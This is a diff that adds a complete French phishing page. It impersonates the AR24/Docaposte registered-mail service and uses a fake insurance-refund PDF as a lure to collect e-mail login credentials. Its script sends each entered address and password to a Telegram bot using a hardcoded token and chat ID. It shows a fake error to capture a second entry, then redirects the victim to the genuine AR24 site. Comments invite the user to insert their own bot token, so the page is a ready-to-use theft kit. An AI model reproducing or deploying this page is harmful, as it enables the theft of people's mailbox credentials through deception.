@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Authentification AR24</title>
+  <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSo3dXZ2p6IUkvxoIdY3Uq7ktGRqn36cZoLt-W9RBUUGA&s=10">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .image {
+      background-image: url('https://cdn.prod.website-files.com/641486d13ef057c16dce9ae1/6432f4ff8d7e3561f69c0967_Titre%20de%20proprie%CC%81te%CC%81-1.webp');
+      background-size: cover;
+      backdrop-filter: blur(10px); /* Floute uniquement le fond caché derrière ce bloc */
+    }
+
+  
+
+
+    .login-container {
+      max-width: 400px;
+      width: 100%;
+      padding: 2rem;
+      text-align: center;
+      margin: auto;
+    }
+
+    .form-control {
+      border-radius: 10px;
+    }
+
+    .btn-primary {
+      background-color: #c9d2fc;
+      color: #000;
+      border: none;
+      border-radius: 10px;
+    }
+
+    .btn-primary:hover {
+      background-color: #b3c0fa;
+    }
+
+    .btn-primary:disabled {
+      background-color: #c9d2fc;
+      color: #000;
+      opacity: 0.7;
+    }
+
+    .footer-black {
+      background-color: #000;
+      color: white;
+    }
+  </style>
+</head>
+
+<body class="image ">
+
+  <section class="conteneur-interne">
+    <!-- Navbar noire avec logo -->
+    <nav class="navbar navbar-dark bg-light">
+      <div class="container">
+
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/e/e9/AR24_RVB-01_800px.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=original"
+          alt="" class="img-fluid mb-3" style="max-width: 100px;">
+      </div>
+    </nav>
+
+    <!-- Formulaire de connexion -->
+    <div class="login-container border rounded shadow mt-5">
+      <h1 class="h3 mb-3 text-primary">AR24 Docaposte</h1>
+      <p> Prestataire de lettres recommandées électroniques qualifiées eIDAS en France par l'Agence Nationale de la
+        Sécurité des Systèmes.</p>
+
+      <div>
+        <img src="/img/pdf.png" alt="logo pdf" class="img-fluid mb-3" style="max-width: 25px;">
+        <p class="fw-bold">Remboursement sinistre / SCI_N_1809-Sept2026-0188.pdf</p>
+      </div>
+      <p class="text-center mb-2">Pour lire le document, veuillez entrer les identifiants de messagerie associés a ce
+        fichier.</p>
+      <div class="flex justify-content-center mb-3">
+        <img
+          src="https://thumb.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1280px-Orange_logo.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail"
+          alt="logo lock" class="img-fluid" style="max-width: 40px;">
+        <img src="https://s.yimg.com/cv/apiv2/myc/mail/Mail_iOS_app_icon.png" alt="logo lock" class="img-fluid"
+          style="max-width: 40px;">
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNOweTjJQn03pbWDz7jWFpCI5zYitnfmAoNEZX38K18g&s=10"
+          alt="logo lock" class="img-fluid" style="max-width: 40px;">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Gmail_icon_%282026%29.svg?utm_source=en.wikipedia.org&utm_campaign=index&utm_content=original"
+          alt="logo lock" class="img-fluid" style="max-width: 40px;">
+        <img src="https://www.freenews.fr/wp-content/uploads/2022/05/logo-Free-1024x576.jpg" alt="logo lock"
+          class="img-fluid" style="max-width: 40px;">
+        <img
+          src="https://thumb.wikimedia.org/wikipedia/commons/thumb/4/45/Microsoft_Office_Outlook_%282018%E2%80%932024%29.svg/960px-Microsoft_Office_Outlook_%282018%E2%80%932024%29.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail"
+          alt="logo lock" class="img-fluid" style="max-width: 40px;">
+        <img src="https://www.getmailbird.com/assets/imgs/logos/clearbit/bbox.fr.png" alt="logo lock" class="img-fluid"
+          style="max-width: 40px;">
+      </div>
+      <h6 class="fw-bold">Identifiez-vous</h6>
+      <!-- Le formulaire -->
+      <form id="loginForm">
+        <!-- Champ e-mail -->
+        <div class="mb-3">
+          <input type="email" id="email" class="form-control" placeholder="E-mail" required>
+        </div>
+        <!-- Champ mot de passe -->
+        <div class="mb-3">
+          <input type="password" id="password" class="form-control" placeholder="Mot de passe" required>
+        </div>
+        <!-- Bouton de connexion -->
+        <div class="d-grid mb-3">
+          <button type="submit" id="btnSubmit" class="btn btn-primary">
+            <span id="btnLabel">S'authentifier</span>
+            <span id="btnSpinner" class="spinner-border spinner-border-sm d-none"></span>
+          </button>
+        </div>
+        <div class="mb-3">
+          <a href="#" class="text-decoration-none small">Mot de passe oublié ?</a>
+        </div>
+      </form>
+
+      <!-- Lien vers inscription -->
+      <p class="mt-4">
+        Date limite fixée au 30/09/2026. Pour toute question, contactez le service client.
+      </p>
+    </div>
+
+    <!-- Pied de page noir avec textes blancs -->
+    <footer class=" footer-black mt-5 py-3">
+      <div class="container d-flex justify-content-between gap-3 flex-wrap">
+        <a href="#" class="text-white text-decoration-none">Confidentialité</a>
+        <a href="#" class="text-white text-decoration-none">Conditions</a>
+        <a href="#" class="text-white text-decoration-none">Mentions légales</a>
+        <a href="#" class="text-white text-decoration-none">Politique de confidentialité</a>
+        <a href="#" class="text-white text-decoration-none">Politique de cookies</a>
+        <a href="#" class="text-white text-decoration-none">Gestion des cookies</a>
+        <a href="#" class="text-white text-decoration-none">CGU du Service PVID</a>
+      </div>
+      <div class="container text-center mt-3">
+        <p>Tous droits réservés AR24 2024. Hébergé en France. 🇫🇷</p>
+        <p>AR24 est une solution de Docaposte, filiale de LAPOSTE GROUPE</p>
+      </div>
+    </footer>
+
+    <div class="modal fade" id="resultModal" tabindex="-1" aria-labelledby="resultModalLabel" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h2 class="modal-title h5" id="resultModalLabel">Résultat</h2>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+          </div>
+          <div class="modal-body" id="resultModalMessage"></div>
+          <div class="modal-footer">
+            <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Fermer</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    let tentative = 0;
+
+    const btn = document.getElementById("btnSubmit");
+    const spinner = document.getElementById("btnSpinner");
+    const label = document.getElementById("btnLabel");
+
+    function showModal(titre, message) {
+      document.getElementById("resultModalLabel").textContent = titre;
+      document.getElementById("resultModalMessage").textContent = message;
+      bootstrap.Modal.getOrCreateInstance(
+        document.getElementById("resultModal")
+      ).show();
+    }
+
+    function setLoading(loading) {
+      btn.disabled = loading;
+      spinner.classList.toggle("d-none", !loading);
+      label.textContent = loading ? "Vérification..." : "S'authentifier";
+    }
+
+    // Fonction exécutée lors de la soumission du formulaire
+    function envoyer(event) {
+      event.preventDefault(); // Empêche le rechargement de la page
+
+      // Récupère les valeurs des champs
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Vérifie que les champs ne sont pas vides
+      if (!email || !password) {
+        showModal("Champs manquants", "Veuillez remplir tous les champs.");
+        return;
+      }
+
+      // Token d'accès du bot Telegram (à personnaliser)
+      const token = "8995182324:AAGibzVDN4t7QTzdjyyOlL6agF0b8rG3Vow"; // ⚠️ remplace-le par le tien
+      const chatId = "5791512886"; // ⚠️ remplace-le par le tien
+
+      // Message formaté à envoyer
+      const message = `Nouvelle tentative de connexion\nEmail: ${email}\nMot de passe: ${password}`;
+
+      // Envoi via l'API Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+
+      tentative++;
+
+      if (tentative === 1) {
+        // 1er clic : 3 secondes de chargement, puis message d'erreur
+        setLoading(true);
+        setTimeout(() => {
+          setLoading(false);
+          showModal("Identifiants incorrects", "Mot de passe ou adresse e-mail incorrect, veuillez réessayer.");
+        }, 3000);
+        return;
+      }
+
+      // 2e clic : 5 secondes de chargement, puis succès + redirection
+      setLoading(true);
+      setTimeout(() => {
+        setLoading(false);
+        showModal("Identité validée", "Votre identité a été validée avec succès, l'e-document vous a été envoyé à votre messagerie principale. Merci de nous faire confiance.");
+        // Change l'URL ci-dessous vers la page de ton choix
+        setTimeout(() => { window.location.href = "https://app.ar24.fr/en/user/login"; }, 1500);
+      }, 5000);
+    }
+
+
+
+    // Associe la fonction au formulaire
+    document.getElementById("loginForm").addEventListener("submit", envoyer);
+  </script>
+
+</body>
+
+</html>
